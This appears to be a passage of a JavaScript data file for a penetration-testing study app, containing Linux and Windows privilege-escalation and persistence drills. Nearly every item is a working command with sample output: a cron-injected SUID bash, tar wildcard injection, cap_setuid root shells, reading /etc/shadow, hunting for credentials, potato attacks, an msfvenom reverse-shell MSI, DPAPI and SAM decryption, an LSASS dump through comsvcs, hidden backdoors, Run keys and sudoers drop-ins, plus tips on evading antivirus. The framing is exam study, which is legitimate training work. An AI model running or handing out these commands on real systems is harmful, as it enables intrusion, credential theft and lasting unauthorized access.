      {"t":"Overwrite a writable cron script","d":"If the script the root cron runs is writable, append a line that leaves you a SUID shell, then wait.","demo":[{"run":"echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/backup.sh && tail -1 /opt/backup.sh","out":"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash","sig":"chmod +s /tmp/rootbash"}],"note":"At the next tick root runs your line, leaving a SUID bash in /tmp."},
      {"t":"Collect the root shell","d":"After the cron fires, the SUID bash is yours; -p keeps euid 0.","demo":[{"run":"/tmp/rootbash -p","out":"rootbash-5.0# id\nuid=33(www-data) euid=0(root)","sig":"euid=0(root)"}],"note":"The cron ran as root and left you a SUID shell: euid 0."},
      {"t":"Exploit a tar wildcard","d":"If the cron runs tar * in a writable dir, create files named as tar options so tar runs your command as root.","demo":[{"run":"echo 'cp /bin/bash /tmp/rbash; chmod +s /tmp/rbash' > shell.sh && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh' && ls","out":"--checkpoint=1\n--checkpoint-action=exec=sh shell.sh\nshell.sh","sig":"--checkpoint-action=exec=sh shell.sh"}],"note":"When root's cron runs tar czf backup.tgz *, the * includes these names and tar treats them as flags, running shell.sh as root."}]},
    "capabilities": {"lead":"A file capability like cap_setuid lets an ordinary binary become root with no SUID bit and no sudo.","items":[
      {"t":"Enumerate capabilities","d":"getcap -r / lists files with capabilities; cap_setuid, cap_dac_read_search and cap_dac_override are the dangerous ones.","demo":[{"run":"getcap -r / 2>/dev/null","out":"/usr/bin/python3.8 = cap_setuid+ep","sig":"cap_setuid+ep"}],"note":"cap_setuid on python means python itself can set uid 0."},
      {"t":"Abuse cap_setuid for a root shell","d":"With cap_setuid, call os.setuid(0) then spawn a shell; the capability lets the call succeed for a normal user.","demo":[{"run":"/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'","out":"# id\nuid=0(root) gid=1000(user)","sig":"uid=0(root)"}],"note":"setuid(0) succeeded because of the capability, giving a uid-0 shell."},
      {"t":"Read any file with cap_dac_read_search","d":"That capability bypasses read-permission checks, so a binary holding it reads root-only files.","demo":[{"run":"tar --xattrs -cf /tmp/s.tar /etc/shadow && tar -xOf /tmp/s.tar etc/shadow | head -1","out":"root:$6$Xq2$9Zk...:19876:0:99999:7:::","sig":"root:$6$"}],"note":"tar holds cap_dac_read_search, so it archives /etc/shadow despite the permissions; extract it to read root's hash. (getcap -r / is how you found the capped binary.)"}]},
    "linux-loot-hunt": {"lead":"Credentials hide in configs, histories and homes; a few greps often find the password privesc did not.","items":[
      {"t":"Grep configs and homes for passwords","d":"A recursive case-insensitive grep over web roots and homes for 'password' catches hardcoded creds.","demo":[{"run":"grep -riE 'password|secret' /var/www /home 2>/dev/null | head","out":"/var/www/html/config.php:$db_pass = 'Sql!2024';","sig":"$db_pass = 'Sql!2024'"}],"note":"A DB password in config.php is a credential to reuse for the database and often for SSH."},
      {"t":"Read shell history and keys","d":"~/.bash_history holds passwords typed inline; mysql -p'...' and ssh commands are classic leaks.","demo":[{"run":"grep -iE 'pass|-p' ~/.bash_history","out":"mysql -u root -pR00tSQL2024\nssh admin@10.10.10.9","sig":"-pR00tSQL2024"}],"note":"A password passed on the command line is saved to history verbatim: free credentials."},
      {"t":"Hunt readable SSH keys","d":"find for id_rsa and world-readable backups; a readable private key is a direct login with no password.","demo":[{"run":"find / -name id_rsa 2>/dev/null","out":"/home/dev/.ssh/id_rsa","sig":"/home/dev/.ssh/id_rsa"}],"note":"A readable id_rsa logs you in as that user over SSH, no password needed."}]},
    "linux-persistence": {"lead":"With root, leave a quiet way back that survives reboots and password changes; record everything you place.","items":[
      {"t":"Add your SSH key to root","d":"Append your public key to /root/.ssh/authorized_keys; you log back in as root with your private key.","demo":[{"run":"mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA...kali' >> /root/.ssh/authorized_keys && tail -1 /root/.ssh/authorized_keys","out":"ssh-ed25519 AAAA...kali","sig":"ssh-ed25519 AAAA...kali"}],"note":"Your key now logs in as root directly, surviving password resets."},
      {"t":"Drop a SUID backdoor","d":"A root-owned SUID copy of bash in an innocuous path gives instant root later with -p.","demo":[{"run":"cp /bin/bash /usr/local/bin/.cache && chmod +s /usr/local/bin/.cache && ls -l /usr/local/bin/.cache","out":"-rwsr-sr-x 1 root root 1234376 /usr/local/bin/.cache","sig":"-rwsr-sr-x 1 root root"}],"note":"/usr/local/bin/.cache -p is a root shell any time; note it so you clean it up later."},
      {"t":"Add a NOPASSWD sudoers drop-in","d":"A file in /etc/sudoers.d lets a low-priv account you own sudo to root with no password.","demo":[{"run":"echo 'user ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/90-cache && visudo -c","out":"/etc/sudoers.d/90-cache: parsed OK","sig":"parsed OK"}],"note":"visudo -c confirms the syntax; now sudo -i as user is instant root."}]}
  };
  Object.keys(LINUX_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = LINUX_HOW[k]; });

  // Bespoke "your turn" for the 7 linux moves that lacked it.
  var LINUX_PRACTICE = {
    "writable-passwd": {situation:"linpeas flags /etc/passwd as group-writable. What is the fastest path to root?", choices:["writable-passwd","sudo-abuse","suid-gtfobins","crack-shadow"], coach:{"sudo-abuse":"Only if sudo -l shows an entry; the lead here is a writable /etc/passwd, which is a direct root add.","suid-gtfobins":"That is for a SUID binary; the finding here is a writable passwd file, a cleaner path.","crack-shadow":"No need to crack anything; a writable /etc/passwd lets you add your own uid-0 user outright."}},
    "nfs-squash": {situation:"An NFS export shows no_root_squash and you have root on your own Kali. What do you do?", choices:["nfs-squash","suid-gtfobins","writable-passwd","linux-loot-hunt"], coach:{"suid-gtfobins":"Related idea (a SUID shell), but here you plant that SUID from your box over the no_root_squash mount, which is the whole point.","writable-passwd":"Different finding; no_root_squash is about writing a root-owned file over NFS, not editing passwd.","linux-loot-hunt":"Looting is for credentials; this export is a direct root path, not a credential hunt."}},
    "lxc-lxd-escape": {situation:"id shows you are in the lxd group. What does that mean for you?", choices:["lxc-lxd-escape","docker-socket","sudo-abuse","linux-enum"], coach:{"docker-socket":"Same class of trick, different daemon; the docker group is for docker, the lxd group is LXD.","sudo-abuse":"You do not need sudo; the lxd group alone is root via a privileged container.","linux-enum":"Already done, that is what showed the lxd group. Now use it."}},
    "docker-socket": {situation:"id shows the docker group, or /var/run/docker.sock is writable. What now?", choices:["docker-socket","lxc-lxd-escape","sudo-abuse","writable-passwd"], coach:{"lxc-lxd-escape":"Same idea with the LXD daemon; here it is docker, so launch a container with / mounted and chroot in.","sudo-abuse":"No sudo needed; the docker group commands a root daemon, which is root on the host.","writable-passwd":"Different finding; the docker socket is a daemon you control, not a writable file."}},
    "capabilities": {situation:"getcap shows /usr/bin/python3 = cap_setuid+ep. What does this give you?", choices:["capabilities","suid-gtfobins","sudo-abuse","linux-enum"], coach:{"suid-gtfobins":"Close, but there is no SUID bit here; a file capability does the same job, and python can call setuid(0) itself.","sudo-abuse":"No sudo involved; cap_setuid lets the binary become root with no sudo entry.","linux-enum":"Already done, the sweep is what found the capability. Now abuse it."}},
    "linux-loot-hunt": {situation:"You have a shell as www-data and no obvious privesc lead yet. What is worth doing before kernel exploits?", choices:["linux-loot-hunt","linux-enum","pspy-monitor","sudo-abuse"], coach:{"linux-enum":"That broad sweep should run first; looting is the targeted credential hunt once the sweep is dry of config leads.","pspy-monitor":"Watching processes is one path when nothing is writable, but a quick grep for passwords in configs and history is faster and often enough.","sudo-abuse":"Only if sudo -l shows something; with no lead, hunting for reused credentials is the quieter next step."}},
    "linux-persistence": {situation:"You just rooted the box in a long-running lab. What is a sensible next step?", choices:["linux-persistence","flag-hunt-linux","linux-loot-hunt","linux-enum"], coach:{"flag-hunt-linux":"Grabbing the proof is the objective and comes first; persistence is the follow-up so a revert does not cost you the root you just earned.","linux-loot-hunt":"Worth doing as root now that you can read everything, but in a long lab drop a way back in first so a revert does not set you back.","linux-enum":"You are already root; the sweep was for finding the way up, which you have done."}}
  };
  Object.keys(LINUX_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = LINUX_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // windows privesc lead-ups: reached from a foothold and the enum line that surfaced the lead.
  // Commands run on the target (where: host). Backslashes double-escaped (\\ renders one).
  var WINDOWS_LEADUPS = {
    "windows-enum": [
      { key: "foothold", label: "A service exploit landed a shell", steps: [
        { title: "Confirm who you are", tool: "whoami", where: "host", cmd: "whoami", out: "corp\\svc_web", sig: "svc_web", teach: "You hold a low-privilege shell; a winpeas sweep surfaces the one misconfiguration that lifts you to SYSTEM." } ] },
    ],
    "seimpersonate": [
      { key: "priv", label: "whoami /priv showed SeImpersonate", steps: [
        { title: "List your token privileges", tool: "whoami", where: "host", cmd: "whoami /priv", out: "SeImpersonatePrivilege          Impersonate a client after authentication  Enabled", sig: "SeImpersonatePrivilege", teach: "A service account holding SeImpersonate can run a potato to become SYSTEM." } ] },
      { key: "winpeas", label: "winpeas highlighted the privilege", steps: [
        { title: "winpeas flagged the token privilege", tool: "winpeas", where: "host", cmd: "winPEASx64.exe quiet | findstr /i impersonate", out: "SeImpersonatePrivilege: Enabled (potato attacks)", sig: "SeImpersonatePrivilege: Enabled", teach: "winpeas calls this out specifically because it is one of the most reliable Windows privescs." } ] },
    ],
    "unquoted-service-path": [
      { key: "winpeas", label: "winpeas flagged an unquoted path", steps: [
        { title: "winpeas flagged an unquoted service path", tool: "winpeas", where: "host", cmd: "winPEASx64.exe quiet | findstr /i unquoted", out: "[!] Unquoted Service Path: C:\\MyApp\\My Service\\service.exe", sig: "Unquoted Service Path", teach: "Windows searches each space-separated prefix; a writable earlier folder lets you hijack the binary." } ] },
    ],
    "weak-service-permissions": [
      { key: "accesschk", label: "accesschk found a writable service", steps: [
        { title: "Check service permissions", tool: "accesschk", where: "host", cmd: "accesschk.exe /accepteula -uwcqv svc_web *", out: "RW regsvc\n        SERVICE_CHANGE_CONFIG", sig: "SERVICE_CHANGE_CONFIG", teach: "SERVICE_CHANGE_CONFIG lets you repoint the service binary to your own, run as its often-SYSTEM account." } ] },
    ],
    "alwaysinstallelevated": [
      { key: "reg", label: "Both AlwaysInstallElevated keys read 1", steps: [
        { title: "Query the HKLM policy key", tool: "reg", where: "host", cmd: "reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", out: "    AlwaysInstallElevated    REG_DWORD    0x1", sig: "0x1", teach: "With the HKLM and HKCU keys both at 1, any MSI you run installs as SYSTEM." } ] },
    ],
    "dpapi-secrets": [
      { key: "user", label: "You own a user with saved credentials", steps: [
        { title: "Confirm the user you control", tool: "whoami", where: "host", cmd: "whoami", out: "corp\\jdoe", sig: "corp\\jdoe", teach: "As jdoe you can decrypt what jdoe saved under DPAPI, often a path to a better account." } ] },
    ],
    "stored-credentials": [
      { key: "cmdkey", label: "cmdkey listed saved credentials", steps: [
        { title: "List stored credentials", tool: "cmdkey", where: "host", cmd: "cmdkey /list", out: "Target: Domain:interactive=CORP\\Administrator\n    Type: Domain Password", sig: "CORP\\Administrator", teach: "A stored Administrator credential runs with runas /savecred without ever showing the password." } ] },
    ],
    "windows-old-hives": [
      { key: "found", label: "A stray upgrade folder turned up", steps: [
        { title: "List the drive root", tool: "dir", where: "host", cmd: "dir C:\\ /a", out: "01/01/2024  <DIR>          Windows.old", sig: "Windows.old", teach: "windows.old holds the old SAM and SYSTEM hives, readable copies of the local account database." } ] },
    ],
    "wesng-patch-gaps": [
      { key: "systeminfo", label: "systeminfo showed a thin patch level", steps: [
        { title: "Read the patch level", tool: "systeminfo", where: "host", cmd: "systeminfo", out: "OS Version: 10.0.17763 N/A Build 17763\nHotfix(s): 2 Hotfix(s) Installed.", sig: "2 Hotfix(s) Installed", teach: "Only two hotfixes on an old build means missing patches; feed systeminfo to wesng for CVE candidates." } ] },
    ],
    "windows-persistence": [
      { key: "system", label: "You reached SYSTEM", steps: [
        { title: "Confirm SYSTEM", tool: "whoami", where: "host", cmd: "whoami", out: "nt authority\\system", sig: "nt authority\\system", teach: "With SYSTEM, add a durable way back before you risk losing the session." } ] },
    ],
    "lsass-dump-onbox": [
      { key: "admin", label: "You hold local admin", steps: [
        { title: "Confirm you are in Administrators", tool: "whoami", where: "host", cmd: "whoami /groups | findstr /i S-1-5-32-544", out: "BUILTIN\\Administrators    Alias    S-1-5-32-544    Enabled group", sig: "BUILTIN\\Administrators", teach: "Local admin lets you read LSASS; everyone logged in since boot has credentials sitting in there." } ] },
    ],
    "defense-enum": [
      { key: "foothold", label: "You have a shell and want to drop tools", steps: [
        { title: "Confirm your foothold", tool: "whoami", where: "host", cmd: "whoami", out: "corp\\svc_web", sig: "svc_web", teach: "Before uploading winpeas or mimikatz, find out what AV or EDR is watching so you do not burn the foothold." } ] },
    ]
  };
  Object.keys(WINDOWS_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = WINDOWS_LEADUPS[k]; });

  // Field notes for the windows privesc lane, every item a playable demo. Backslashes double-escaped.
  var WINDOWS_HOW = {
    "windows-enum": {"lead":"Windows privesc is a reading exercise: run winpeas, then hunt the flood for the one line that matters.","items":[
      {"t":"Run winpeas","d":"winpeas colour-codes findings; red is near-certain. Serve it over SMB or HTTP and run it from the shell.","demo":[{"run":"winPEASx64.exe quiet","out":"[+] Checking AlwaysInstallElevated\n    AlwaysInstallElevated set to 1 in HKLM and HKCU","sig":"AlwaysInstallElevated set to 1"}],"note":"A red AlwaysInstallElevated line is a direct SYSTEM path; start there."},
      {"t":"Check privileges and groups by hand","d":"whoami /priv and /groups are instant; SeImpersonate, SeBackup, or an admin group are immediate leads.","demo":[{"run":"whoami /priv","out":"SeImpersonatePrivilege          Impersonate a client after authentication  Enabled\nSeChangeNotifyPrivilege         Bypass traverse checking                    Enabled","sig":"SeImpersonatePrivilege"}],"note":"SeImpersonate enabled means the potato family is on the table."},
      {"t":"Read the patch level","d":"A thin systeminfo hotfix list points at kernel exploits when the config paths come up empty.","demo":[{"run":"systeminfo | findstr /i \"OS Hotfix\"","out":"OS Version: 10.0.17763 N/A Build 17763\nHotfix(s): 2 Hotfix(s) Installed.","sig":"2 Hotfix(s) Installed"}],"note":"Two hotfixes on an old build is a wesng lead to chase later."}]},
    "seimpersonate": {"lead":"SeImpersonate lets a service account impersonate SYSTEM through a named-pipe trick; the potato family automates it.","items":[
      {"t":"Pick the right potato","d":"PrintSpoofer and GodPotato work on modern Windows; JuicyPotato is for older builds. Run the one that fits.","demo":[{"run":"PrintSpoofer64.exe -i -c cmd","out":"[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nC:\\Windows\\system32> whoami\nnt authority\\system","sig":"nt authority\\system"}],"note":"PrintSpoofer spawned a cmd running as SYSTEM; whoami inside it confirms the impersonation."},
      {"t":"Run a single command as SYSTEM","d":"Instead of an interactive shell, run one command: add an admin or launch a payload.","demo":[{"run":"GodPotato.exe -cmd \"cmd /c whoami\"","out":"[*] CombaseModule: 0x7ff8...\nnt authority\\system","sig":"nt authority\\system"}],"note":"GodPotato returned SYSTEM output; swap whoami for your payload."},
      {"t":"Catch a SYSTEM reverse shell","d":"Point the potato command at a reverse-shell binary you serve; a listener on Kali catches SYSTEM.","demo":[{"run":"PrintSpoofer64.exe -c \"C:\\Temp\\rev.exe\"","out":"(on your listener)  Connection from <target>\nnt authority\\system","sig":"nt authority\\system"}],"note":"The potato launched rev.exe as SYSTEM; the shell lands on your listener."}]},
    "unquoted-service-path": {"lead":"An unquoted path with a space lets you drop a binary in an earlier folder Windows tries first.","items":[
      {"t":"Find the unquoted path","d":"List service paths; one without quotes and with a space in a writable folder is the target.","demo":[{"run":"wmic service get name,pathname | findstr /i \"program files\"","out":"MyApp    C:\\MyApp\\My Service\\service.exe","sig":"C:\\MyApp\\My Service\\service.exe"}],"note":"Unquoted with a space: Windows tries C:\\MyApp.exe, then C:\\MyApp\\My.exe, before the real path."},
      {"t":"Confirm a writable folder in the path","d":"icacls each prefix folder; a (W) or (F) for your group on an early one means you can plant there.","demo":[{"run":"icacls C:\\MyApp","out":"C:\\MyApp BUILTIN\\Users:(W)","sig":"BUILTIN\\Users:(W)"}],"note":"Users can write to C:\\MyApp, which comes earlier in the search order than the real service.exe."},
      {"t":"Plant and restart","d":"Drop your payload as the first-matched name and restart the service, or wait for a reboot.","demo":[{"run":"copy rev.exe \"C:\\MyApp\\My.exe\" && sc stop MyApp && sc start MyApp","out":"[SC] StartService FAILED 1053\n(on your listener)  nt authority\\system","sig":"nt authority\\system"}],"note":"The service tried C:\\MyApp\\My.exe (as SYSTEM) before the real service.exe; the 1053 is expected since your binary is not a true service."}]},
    "weak-service-permissions": {"lead":"If you can change a service's config, repoint its binary to yours and it runs as the service account.","items":[
      {"t":"Find a service you can reconfigure","d":"accesschk flags services where your group holds SERVICE_CHANGE_CONFIG, enough to repoint the binary.","demo":[{"run":"accesschk.exe /accepteula -uwcqv %USERNAME% *","out":"RW daclsvc\n        SERVICE_CHANGE_CONFIG","sig":"SERVICE_CHANGE_CONFIG"}],"note":"SERVICE_CHANGE_CONFIG on daclsvc means you can point it at any binary."},
      {"t":"Repoint the binary path","d":"sc config sets binPath to your command; most such services run as LocalSystem.","demo":[{"run":"sc config daclsvc binPath= \"C:\\Temp\\rev.exe\"","out":"[SC] ChangeServiceConfig SUCCESS","sig":"ChangeServiceConfig SUCCESS"}],"note":"The service will now launch rev.exe on start."},
      {"t":"Restart to trigger it","d":"Stop and start the service (or reboot); it executes your binary as its account.","demo":[{"run":"sc stop daclsvc & sc start daclsvc","out":"(on your listener)  nt authority\\system","sig":"nt authority\\system"}],"note":"daclsvc ran your binary as SYSTEM; catch the shell on your listener."}]},
    "alwaysinstallelevated": {"lead":"With both policy keys set, any MSI installs as SYSTEM; build one that runs your payload.","items":[
      {"t":"Confirm both keys are 1","d":"Both HKLM and HKCU must read 0x1; one alone does nothing.","demo":[{"run":"reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated","out":"    AlwaysInstallElevated    REG_DWORD    0x1","sig":"0x1"}],"note":"HKCU is 1; confirm HKLM too, then the MSI route is open."},
      {"t":"Build a malicious MSI","d":"msfvenom produces an MSI that runs your command or shellcode when installed.","demo":[{"run":"msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=4444 -f msi -o evil.msi","out":"Payload size: 324 bytes\nSaved as: evil.msi","sig":"Saved as: evil.msi"}],"note":"Any MSI payload works; a reverse shell is the usual choice."},
      {"t":"Install it quietly","d":"msiexec /quiet installs with SYSTEM rights because of the policy; your payload runs as SYSTEM.","demo":[{"run":"msiexec /quiet /qn /i C:\\Temp\\evil.msi","out":"(on your listener)  nt authority\\system","sig":"nt authority\\system"}],"note":"The installer ran as SYSTEM, so your payload did too."}]},
    "dpapi-secrets": {"lead":"DPAPI credentials decrypt once you are the owning user or SYSTEM; mimikatz or impacket do the work.","items":[
      {"t":"Find the DPAPI blobs","d":"Credentials live under AppData\\Microsoft\\Credentials and Vault; list them before decrypting.","demo":[{"run":"dir /a C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\Credentials","out":"01/01/2024              11,220 DFBE70A7E5CC19A398EBF1B96859CE5D","sig":"DFBE70A7E5CC19A398EBF1B96859CE5D"}],"note":"Each blob is an encrypted credential; you need the masterkey to open it."},
      {"t":"Decrypt with mimikatz","d":"dpapi::cred with the decrypted masterkey (from dpapi::masterkey, or sekurlsa::dpapi as SYSTEM) turns the blob into plaintext.","demo":[{"run":"mimikatz # dpapi::cred /in:C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7 /masterkey:a1b2c3d4e5f6a7b8","out":"TargetName : Domain:target=SQL01\n  UserName : CORP\\sqladmin\n  Password : Summ3r2024!","sig":"Password : Summ3r2024!"}],"note":"The decrypted blob held sqladmin's password, a more privileged account."},
      {"t":"Or pull them offline with impacket","d":"With the masterkey and the user/SYSTEM key you can run dpapi.py on Kali, away from the box.","demo":[{"run":"impacket-dpapi credential -file DFBE70A7 -key 0x5a3b...","out":"[CREDENTIAL]\nUsername : CORP\\sqladmin\nPassword : Summ3r2024!","sig":"Password : Summ3r2024!"}],"note":"Offline decryption keeps mimikatz off the target entirely."}]},
    "stored-credentials": {"lead":"Windows squirrels passwords away in cmdkey, the registry, unattend files, and configs; a few checks find them.","items":[
      {"t":"List saved credentials","d":"cmdkey /list shows stored logons you can use with runas /savecred without the password.","demo":[{"run":"cmdkey /list","out":"Target: Domain:interactive=CORP\\Administrator\n    Type: Domain Password","sig":"CORP\\Administrator"}],"note":"A saved Administrator credential runs commands as admin via runas /savecred."},
      {"t":"Use a saved credential","d":"runas /savecred runs your command as the stored account without ever prompting for the password.","demo":[{"run":"runas /savecred /user:CORP\\Administrator \"cmd /c whoami\"","out":"corp\\administrator","sig":"corp\\administrator"}],"note":"The command ran as Administrator using the cached credential."},
      {"t":"Grep the registry for passwords","d":"Autologon, PuTTY sessions, and VNC keep plaintext in the registry; reg query surfaces them.","demo":[{"run":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword","out":"    DefaultPassword    REG_SZ    P@ssw0rd!","sig":"DefaultPassword    REG_SZ    P@ssw0rd!"}],"note":"An autologon DefaultPassword in the registry is a plaintext credential."}]},
    "windows-old-hives": {"lead":"The SAM and SYSTEM hives, from windows.old or a backup, dump offline to local hashes with secretsdump.","items":[
      {"t":"Locate readable hives","d":"windows.old\\Windows\\System32\\config holds SAM and SYSTEM; backups sometimes sit in shares or at C:\\.","demo":[{"run":"dir C:\\Windows.old\\Windows\\System32\\config\\SAM","out":"01/01/2024              65,536 SAM","sig":"65,536 SAM"}],"note":"A readable SAM plus its SYSTEM hive is everything secretsdump needs."},
      {"t":"Copy the hives to Kali","d":"Pull SAM and SYSTEM off the box (SMB or a share) so you dump them offline.","demo":[{"run":"copy C:\\Windows.old\\Windows\\System32\\config\\SAM \\\\<lhost>\\share\\","out":"        1 file(s) copied.","sig":"1 file(s) copied"}],"note":"Both hives on Kali let you dump without touching LSASS or running tools on the target."},
      {"t":"Dump the local hashes","d":"secretsdump -sam -system parses them into NTLM hashes; the Administrator hash is often still valid.","demo":[{"run":"impacket-secretsdump -sam SAM -system SYSTEM LOCAL","out":"Administrator:500:aad3b435b51404eeaad3b435b51404ee:f2a4e8c1b9d05e3a7c6f1b2e4d8a9c03:::","sig":"Administrator:500:"}],"note":"The local Administrator hash cracks or passes; try it across the network for reuse."}]},
    "wesng-patch-gaps": {"lead":"wesng maps systeminfo output to missing-patch CVEs when the config paths run dry.","items":[
      {"t":"Capture systeminfo","d":"Save the full systeminfo output; wesng reads the OS build and installed hotfixes from it.","demo":[{"run":"systeminfo > sysinfo.txt & type sysinfo.txt | findstr /i \"Version Hotfix\"","out":"OS Version: 10.0.17763 N/A Build 17763\nHotfix(s): 2 Hotfix(s) Installed.","sig":"Build 17763"}],"note":"The build and hotfix list are what wesng needs; copy sysinfo.txt to Kali."},
      {"t":"Run wesng against it","d":"wesng compares the build and KBs to its CVE database and ranks exploitable gaps.","demo":[{"run":"wes.py sysinfo.txt --impact \"Elevation of Privilege\"","out":"[+] CVE-2021-36934 (SeriousSAM) - Elevation of Privilege - Exploit available","sig":"CVE-2021-36934"}],"note":"SeriousSAM is a strong hit; a listed exploit is the candidate to verify."},
      {"t":"Filter to exploit-backed privesc","d":"Narrow to EoP with exploits available so you are not chasing theoretical CVEs.","demo":[{"run":"wes.py sysinfo.txt --exploits-only --impact \"Elevation of Privilege\"","out":"CVE-2020-0787 (BITS Arbitrary File Move)  Exploit: github.com/...","sig":"CVE-2020-0787"}],"note":"An exploit-backed EoP CVE is worth trying; theoretical ones rarely pay off on the exam."}]},
    "windows-persistence": {"lead":"With SYSTEM or admin, leave a durable way back: a new admin, RDP, or a run key. Record everything.","items":[
      {"t":"Add a local admin","d":"net user plus net localgroup creates an account in Administrators that survives reboots.","demo":[{"run":"net user svc_upd P@ss2024! /add && net localgroup Administrators svc_upd /add","out":"The command completed successfully.","sig":"completed successfully"}],"note":"svc_upd is now a local admin; log in with it any time."},
      {"t":"Enable RDP for the way back","d":"Turn RDP on and add the account to Remote Desktop Users for an interactive return.","demo":[{"run":"reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f","out":"The operation completed successfully.","sig":"operation completed successfully"}],"note":"RDP is on; your new admin can log straight into the desktop."},
      {"t":"Add a Run-key backdoor","d":"A Run key re-launches your payload at every logon; a service does it at boot.","demo":[{"run":"reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d \"C:\\Temp\\rev.exe\" /f","out":"The operation completed successfully.","sig":"operation completed successfully"}],"note":"rev.exe now runs at every logon; note it for cleanup."}]},
    "lsass-dump-onbox": {"lead":"Dump LSASS with a living-off-the-land method, ship the .dmp to Kali, and parse it with pypykatz.","items":[
      {"t":"Find the LSASS PID","d":"The built-in comsvcs MiniDump needs the LSASS process id; tasklist gives it.","demo":[{"run":"tasklist | findstr /i lsass","out":"lsass.exe                      672 Services                   0     18,400 K","sig":"lsass.exe                      672"}],"note":"PID 672 is LSASS; feed it to the comsvcs MiniDump next."},
      {"t":"Write the dump with comsvcs.dll","d":"rundll32 comsvcs MiniDump writes a full dump with nothing uploaded; AV often flags it, so check defenses first.","demo":[{"run":"rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full","out":"(C:\\Temp\\lsass.dmp written, ~42 MB)","sig":"lsass.dmp"}],"note":"No tool uploaded; the dump is a native Windows capability."},
      {"t":"Parse it offline with pypykatz","d":"On Kali, pypykatz reads the .dmp and prints hashes, tickets, and cached plaintext.","demo":[{"run":"pypykatz lsa minidump lsass.dmp","out":"== MSV ==\n  Username: Administrator\n  NT: f2a4e8c1b9d05e3a7c6f1b2e4d8a9c03","sig":"NT: f2a4e8c1b9d05e3a7c6f1b2e4d8a9c03"}],"note":"Every logged-in user's hash falls out; a domain admin's is the jackpot."}]},
    "defense-enum": {"lead":"Before you drop tools, learn what is watching: Defender state, third-party EDR, and script policy.","items":[
      {"t":"Check Defender status","d":"Get-MpComputerStatus shows whether real-time and tamper protection are on.","demo":[{"run":"powershell -c \"Get-MpComputerStatus | Select RealTimeProtectionEnabled\"","out":"RealTimeProtectionEnabled : True","sig":"RealTimeProtectionEnabled : True"}],"note":"Real-time protection on means winpeas and mimikatz will likely be caught; obfuscate or go native."},
      {"t":"List installed AV and EDR","d":"SecurityCenter2 enumerates registered AV products, revealing third-party EDR beyond Defender.","demo":[{"run":"wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName","out":"displayName\nWindows Defender\nCrowdStrike Falcon Sensor","sig":"CrowdStrike Falcon Sensor"}],"note":"CrowdStrike is a serious EDR; tool choice and obfuscation matter a great deal here."},
      {"t":"Check PowerShell language mode","d":"Constrained Language Mode blocks most PowerShell tradecraft; know before you lean on scripts.","demo":[{"run":"powershell -c \"$ExecutionContext.SessionState.LanguageMode\"","out":"ConstrainedLanguage","sig":"ConstrainedLanguage"}],"note":"Constrained Language Mode blocks most PowerShell tooling; fall back to native binaries."}]}
  };
  Object.keys(WINDOWS_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = WINDOWS_HOW[k]; });

  // Bespoke "your turn" for the 7 windows moves that lacked it.
  var WINDOWS_PRACTICE = {
    "dpapi-secrets": {situation:"You own jdoe and found encrypted credential blobs in his AppData. What unlocks them?", choices:["dpapi-secrets","stored-credentials","lsass-dump-onbox","crack-ntlm"], coach:{"stored-credentials":"cmdkey and the registry hold some creds in the clear, but these blobs are DPAPI-encrypted; you need the masterkey, which being jdoe gives you.","lsass-dump-onbox":"That needs admin and reads live sessions; DPAPI decrypts jdoe's saved secrets with just jdoe's keys.","crack-ntlm":"There is no NTLM hash here; DPAPI blobs decrypt with the user's masterkey, they are not cracked."}},
    "stored-credentials": {situation:"You have a shell as a service account and want quick wins before deep enumeration. What is worth a look?", choices:["stored-credentials","dpapi-secrets","windows-enum","lsass-dump-onbox"], coach:{"dpapi-secrets":"That decrypts DPAPI vaults and needs the masterkey; cmdkey and registry autologon are the plaintext, no-decrypt checks to do first.","windows-enum":"The broad sweep runs in parallel, but cmdkey /list and a couple of reg queries are instant and often hand you a credential outright.","lsass-dump-onbox":"Needs admin you may not have yet; stored-credential checks work as any user."}},
    "windows-old-hives": {situation:"dir C:\\ shows a Windows.old folder and you are a low-priv user. What does that offer?", choices:["windows-old-hives","lsass-dump-onbox","crack-ntlm","dump-secrets"], coach:{"lsass-dump-onbox":"That reads live memory and needs admin; windows.old is old hive files on disk you can often read without admin at all.","crack-ntlm":"Cracking comes after you dump the hives; first pull SAM and SYSTEM from windows.old and run secretsdump.","dump-secrets":"That is the remote/domain dump; here the credentials sit in local hive files left by an upgrade."}},
